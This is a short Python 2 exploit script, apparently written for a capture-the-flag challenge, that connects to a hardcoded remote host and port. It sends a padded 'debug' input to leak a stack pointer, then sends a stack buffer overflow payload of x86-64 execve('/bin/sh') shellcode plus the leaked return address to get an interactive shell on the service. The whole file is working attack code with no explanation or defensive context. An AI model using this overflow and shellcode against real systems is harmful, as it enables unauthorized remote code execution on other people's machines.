import socket
#--------------------------------------------------------------------------------------------
def x2s(x, size=8):
        s=''
        i=0
        while i < size:
                s += chr((x>>(i*8))&0xff)
                i += 1
        return s
#-------------------------------------------------------------------------------------------
debug = 'debug\x00'.ljust(0xa8,'A')+x2s(0x401062)
shell = '48b82f62696e2f736800504889e74831f64831d24831c0b03b0f054831c0b03c0f05'.decode('hex')

sDebug = 'DEBUG query pointer:'
lDebug = len(sDebug)

sock = socket.socket()
sock.settimeout(20)
sock.connect(('109.233.56.92',13372))

while True:
        data = ''
        i=0
        while True:
                try:
                        ss = sock.recv(4096)
                        data += ss
                except:
                        break
                if len(data) == 0:
                        i += 1
                        if i == 50:
                                break
                else:
                        break
        print data

        p0 = data.find(sDebug)
        if p0 != -1:
                p1 = data.find('\x0a',p0)
                aPoint = int(data[p0+lDebug+3:p1],16)
                payload = shell.ljust(0xa8,'\x90')+x2s(aPoint)

        cmd = raw_input('my>')

        if cmd == 'quit':
                break

        if cmd == 'debug':
                sock.send(debug+'\n')
                continue
        
        if cmd == 'shell':
                sock.send(payload+'\n')
                continue

        sock.send(cmd+'\n')

sock.close()


